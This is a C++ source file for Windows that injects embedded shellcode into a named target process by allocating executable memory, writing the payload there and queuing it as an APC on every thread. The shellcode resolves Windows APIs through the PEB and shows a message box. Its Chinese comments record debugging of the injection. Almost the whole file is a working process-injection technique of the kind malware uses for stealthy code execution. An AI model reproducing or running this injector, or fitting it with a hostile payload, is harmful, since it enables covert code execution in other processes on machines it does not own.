﻿#include <windows.h>
#include <iostream>
#include <Tlhelp32.h>
#include <vector>
using namespace std;

UCHAR shellcode[] = { 0x55,0x8B,0xEC,0x83,0xEC,0x60,0xE8,0x95,0x01,0x00,0x00,0x50,0xE8,0xAF,0x01,0x00,0x00,0x83,0xC4,0x04,0x89,0x45,0xFC,0xC6,0x45,0xCC,0x4C,0xC6,0x45,0xCD,0x6F,0xC6,0x45,0xCE,0x61,0xC6,0x45,0xCF,0x64,0xC6,0x45,0xD0,0x4C,0xC6,0x45,0xD1,0x69,0xC6,0x45,0xD2,0x62,0xC6,0x45,0xD3,0x72,0xC6,0x45,0xD4,0x61,0xC6,0x45,0xD5,0x72,0xC6,0x45,0xD6,0x79,0xC6,0x45,0xD7,0x57,0xC6,0x45,0xD8,0x00,0x8D,0x45,0xCC,0x50,0xE8,0x4C,0x01,0x00,0x00,0x50,0xFF,0x55,0xFC,0x89,0x45,0xF8,0xB9,0x75,0x00,0x00,0x00,0x66,0x89,0x4D,0xA0,0xBA,0x73,0x00,0x00,0x00,0x66,0x89,0x55,0xA2,0xB8,0x65,0x00,0x00,0x00,0x66,0x89,0x45,0xA4,0xB9,0x72,0x00,0x00,0x00,0x66,0x89,0x4D,0xA6,0xBA,0x33,0x00,0x00,0x00,0x66,0x89,0x55,0xA8,0xB8,0x32,0x00,0x00,0x00,0x66,0x89,0x45,0xAA,0xB9,0x2E,0x00,0x00,0x00,0x66,0x89,0x4D,0xAC,0xBA,0x64,0x00,0x00,0x00,0x66,0x89,0x55,0xAE,0xB8,0x6C,0x00,0x00,0x00,0x66,0x89,0x45,0xB0,0xB9,0x6C,0x00,0x00,0x00,0x66,0x89,0x4D,0xB2,0x33,0xD2,0x66,0x89,0x55,0xB4,0xC6,0x45,0xDC,0x4D,0xC6,0x45,0xDD,0x65,0xC6,0x45,0xDE,0x73,0xC6,0x45,0xDF,0x73,0xC6,0x45,0xE0,0x61,0xC6,0x45,0xE1,0x67,0xC6,0x45,0xE2,0x65,0xC6,0x45,0xE3,0x42,0xC6,0x45,0xE4,0x6F,0xC6,0x45,0xE5,0x78,0xC6,0x45,0xE6,0x57,0xC6,0x45,0xE7,0x00,0x8D,0x45,0xDC,0x50,0x8D,0x4D,0xA0,0x51,0xFF,0x55,0xF8,0x50,0xFF,0x55,0xFC,0x89,0x45,0xF4,0xBA,0x53,0x00,0x00,0x00,0x66,0x89,0x55,0xB8,0xB8,0x68,0x00,0x00,0x00,0x66,0x89,0x45,0xBA,0xB9,0x65,0x00,0x00,0x00,0x66,0x89,0x4D,0xBC,0xBA,0x6C,0x00,0x00,0x00,0x66,0x89,0x55,0xBE,0xB8,0x6C,0x00,0x00,0x00,0x66,0x89,0x45,0xC0,0xB9,0x63,0x00,0x00,0x00,0x66,0x89,0x4D,0xC2,0xBA,0x6F,0x00,0x00,0x00,0x66,0x89,0x55,0xC4,0xB8,0x64,0x00,0x00,0x00,0x66,0x89,0x45,0xC6,0xB9,0x65,0x00,0x00,0x00,0x66,0x89,0x4D,0xC8,0x33,0xD2,0x66,0x89,0x55,0xCA,0xB8,0x4C,0x00,0x00,0x00,0x66,0x89,0x45,0xE8,0xB9,0x59,0x00,0x00,0x00,0x66,0x89,0x4D,0xEA,0xBA,0x53,0x00,0x00,0x00,0x66,0x89,0x55,0xEC,0xB8,0x4D,0x00,0x00,0x00,0x66,0x89,0x45,0xEE,0x33,0xC9,0x66,0x89,0x4D,0xF0,0x6A,0x00,0x8D,0x55,0xE8,0x52,0x8D,0x45,0xB8,0x50,0x6A,0x00,0xFF,0x55,0xF4,0x33,0xC0,0x8B,0xE5,0x5D,0xC3,0xCC,0xCC,0xCC,0xCC,0xCC,0xCC,0xCC,0xCC,0xCC,0xCC,0xCC,0xCC,0xCC,0x64,0xA1,0x30,0x00,0x00,0x00,0x8B,0x40,0x0C,0x8B,0x40,0x14,0x8B,0x00,0x8B,0x00,0x8B,0x40,0x10,0xC3,0xCC,0xCC,0xCC,0xCC,0xCC,0xCC,0xCC,0xCC,0xCC,0xCC,0xCC,0xCC,0x55,0x8B,0xEC,0x83,0xEC,0x24,0x8B,0x45,0x08,0x89,0x45,0xE8,0x8B,0x4D,0xE8,0x8B,0x55,0x08,0x03,0x51,0x3C,0x89,0x55,0xF0,0xB8,0x08,0x00,0x00,0x00,0x6B,0xC8,0x00,0x8B,0x55,0xF0,0x83,0x7C,0x0A,0x7C,0x00,0x75,0x07,0x33,0xC0,0xE9,0xE3,0x01,0x00,0x00,0xB8,0x08,0x00,0x00,0x00,0x6B,0xC8,0x00,0x8B,0x55,0xF0,0x83,0x7C,0x0A,0x78,0x00,0x75,0x07,0x33,0xC0,0xE9,0xCA,0x01,0x00,0x00,0xB8,0x08,0x00,0x00,0x00,0x6B,0xC8,0x00,0x8B,0x55,0xF0,0x8B,0x45,0x08,0x03,0x44,0x0A,0x78,0x89,0x45,0xF4,0x8B,0x4D,0xF4,0x8B,0x55,0x08,0x03,0x51,0x20,0x89,0x55,0xE4,0x8B,0x45,0xF4,0x8B,0x4D,0x08,0x03,0x48,0x24,0x89,0x4D,0xE0,0x8B,0x55,0xF4,0x8B,0x45,0x08,0x03,0x42,0x1C,0x89,0x45,0xDC,0xC7,0x45,0xF8,0x00,0x00,0x00,0x00,0xC7,0x45,0xEC,0x00,0x00,0x00,0x00,0xEB,0x09,0x8B,0x4D,0xF8,0x83,0xC1,0x01,0x89,0x4D,0xF8,0x8B,0x55,0xF4,0x8B,0x42,0x18,0x83,0xE8,0x01,0x39,0x45,0xF8,0x0F,0x87,0x63,0x01,0x00,0x00,0x8B,0x4D,0xF8,0x8B,0x55,0xE4,0x8B,0x04,0x8A,0x03,0x45,0x08,0x89,0x45,0xFC,0xB9,0x01,0x00,0x00,0x00,0x6B,0xD1,0x00,0x8B,0x45,0xFC,0x0F,0xBE,0x0C,0x10,0x83,0xF9,0x47,0x0F,0x85,0x37,0x01,0x00,0x00,0xBA,0x01,0x00,0x00,0x00,0xC1,0xE2,0x00,0x8B,0x45,0xFC,0x0F,0xBE,0x0C,0x10,0x83,0xF9,0x65,0x0F,0x85,0x1F,0x01,0x00,0x00,0xBA,0x01,0x00,0x00,0x00,0xD1,0xE2,0x8B,0x45,0xFC,0x0F,0xBE,0x0C,0x10,0x83,0xF9,0x74,0x0F,0x85,0x08,0x01,0x00,0x00,0xBA,0x01,0x00,0x00,0x00,0x6B,0xC2,0x03,0x8B,0x4D,0xFC,0x0F,0xBE,0x14,0x01,0x83,0xFA,0x50,0x0F,0x85,0xF0,0x00,0x00,0x00,0xB8,0x01,0x00,0x00,0x00,0xC1,0xE0,0x02,0x8B,0x4D,0xFC,0x0F,0xBE,0x14,0x01,0x83,0xFA,0x72,0x0F,0x85,0xD8,0x00,0x00,0x00,0xB8,0x01,0x00,0x00,0x00,0x6B,0xC8,0x05,0x8B,0x55,0xFC,0x0F,0xBE,0x04,0x0A,0x83,0xF8,0x6F,0x0F,0x85,0xC0,0x00,0x00,0x00,0xB9,0x01,0x00,0x00,0x00,0x6B,0xD1,0x06,0x8B,0x45,0xFC,0x0F,0xBE,0x0C,0x10,0x83,0xF9,0x63,0x0F,0x85,0xA8,0x00,0x00,0x00,0xBA,0x01,0x00,0x00,0x00,0x6B,0xC2,0x07,0x8B,0x4D,0xFC,0x0F,0xBE,0x14,0x01,0x83,0xFA,0x41,0x0F,0x85,0x90,0x00,0x00,0x00,0xB8,0x01,0x00,0x00,0x00,0xC1,0xE0,0x03,0x8B,0x4D,0xFC,0x0F,0xBE,0x14,0x01,0x83,0xFA,0x64,0x75,0x7C,0xB8,0x01,0x00,0x00,0x00,0x6B,0xC8,0x09,0x8B,0x55,0xFC,0x0F,0xBE,0x04,0x0A,0x83,0xF8,0x64,0x75,0x68,0xB9,0x01,0x00,0x00,0x00,0x6B,0xD1,0x0A,0x8B,0x45,0xFC,0x0F,0xBE,0x0C,0x10,0x83,0xF9,0x72,0x75,0x54,0xBA,0x01,0x00,0x00,0x00,0x6B,0xC2,0x0B,0x8B,0x4D,0xFC,0x0F,0xBE,0x14,0x01,0x83,0xFA,0x65,0x75,0x40,0xB8,0x01,0x00,0x00,0x00,0x6B,0xC8,0x0C,0x8B,0x55,0xFC,0x0F,0xBE,0x04,0x0A,0x83,0xF8,0x73,0x75,0x2C,0xB9,0x01,0x00,0x00,0x00,0x6B,0xD1,0x0D,0x8B,0x45,0xFC,0x0F,0xBE,0x0C,0x10,0x83,0xF9,0x73,0x75,0x18,0x8B,0x55,0xF8,0x8B,0x45,0xE0,0x0F,0xB7,0x0C,0x50,0x8B,0x55,0xDC,0x8B,0x04,0x8A,0x03,0x45,0x08,0x89,0x45,0xEC,0xEB,0x05,0xE9,0x82,0xFE,0xFF,0xFF,0x8B,0x45,0xEC,0x8B,0xE5,0x5D,0xC3,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00 };


DWORD GetProcessPid(char *ProcessName);
std::vector<DWORD> GetThreadTid(DWORD Pid);


int main(int argc, char* arg[])
{
	// 1. get target process
	DWORD Pid = GetProcessPid(arg[1]);
	HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, Pid);

	// 2. write shellcode into target process
	LPVOID AllocMemory = VirtualAllocEx(hProcess, NULL, sizeof(shellcode), MEM_COMMIT, PAGE_EXECUTE_READWRITE);	//没注进去是这个最后一个参数设置的问题

	// 3. write shellcode into process
	WriteProcessMemory(hProcess, AllocMemory, shellcode, sizeof(shellcode), NULL);

	// 4. find all threads belong to target process.
	std::vector<DWORD> ThreadTids = GetThreadTid(Pid);

	//5. Inject APC into all threads of target process
	for (DWORD threadId : ThreadTids) // 将所有的线程都插入APC调用.
	{
		HANDLE hThread = OpenThread(THREAD_ALL_ACCESS, TRUE, threadId);
		QueueUserAPC((PAPCFUNC)AllocMemory, hThread, NULL);	// 类似 CreateRemoteThread, 入口放在存shellcode的内存地址.
		// Sleep(10 * 2); 这个并不能让线程进入Alert状态, 要在shellcode里写这个让目标Thread执行才行. 同理 NtTestAlert
		cout << threadId << "APC injection successful" << endl;
		CloseHandle(hThread);
	}
	CloseHandle(hProcess);
	return 0;
}

DWORD GetProcessPid(char *ProcessName)
{
	HANDLE hProcessSnap = NULL;   //define snapshot
	DWORD ProcessID = 0;
	PROCESSENTRY32 pe32 = { 0 };
	hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);   //create snapshot of all process in system
	pe32.dwSize = sizeof(PROCESSENTRY32);
	if (Process32First(hProcessSnap, &pe32))
	{
		do
		{
			if (!strcmp(ProcessName, pe32.szExeFile))
			{
				ProcessID = pe32.th32ProcessID;
				break;
			}
		} while (Process32Next(hProcessSnap, &pe32));
	}
	CloseHandle(hProcessSnap);
	return ProcessID;

	// 另一种比较快的写法
	/*
	HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS | TH32CS_SNAPTHREAD, 0);  // 它这里是把进程线程都生成快照
	HANDLE victimProcess = NULL;
	PROCESSENTRY32 processEntry = { sizeof(PROCESSENTRY32) };
	THREADENTRY32 threadEntry = { sizeof(THREADENTRY32) };
	std::vector<DWORD> threadIds;
	SIZE_T shellSize = sizeof(buf);
	HANDLE threadHandle = NULL;

	if (Process32First(snapshot, &processEntry)) {
		while (_wcsicmp(processEntry.szExeFile, L"explorer.exe") != 0) {
			Process32Next(snapshot, &processEntry);
		}
	}

	if (Thread32First(snapshot, &threadEntry)) {
		do {
			if (threadEntry.th32OwnerProcessID == processEntry.th32ProcessID) {
				threadIds.push_back(threadEntry.th32ThreadID);
			}
		} while (Thread32Next(snapshot, &threadEntry));
	}
	*/
}

std::vector<DWORD> GetThreadTid(DWORD Pid)
{
	HANDLE hThreadSnap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);  // 线程快照
	THREADENTRY32 threadEntry = { sizeof(THREADENTRY32) };
	std::vector<DWORD> threadIds;
	SIZE_T shellSize = sizeof(shellcode);
	HANDLE threadHandle = NULL;
	if (Thread32First(hThreadSnap, &threadEntry)) {
		do {
			if (threadEntry.th32OwnerProcessID == Pid) {
				threadIds.push_back(threadEntry.th32ThreadID);
			}
		} while (Thread32Next(hThreadSnap, &threadEntry));
	}
	return threadIds;
}

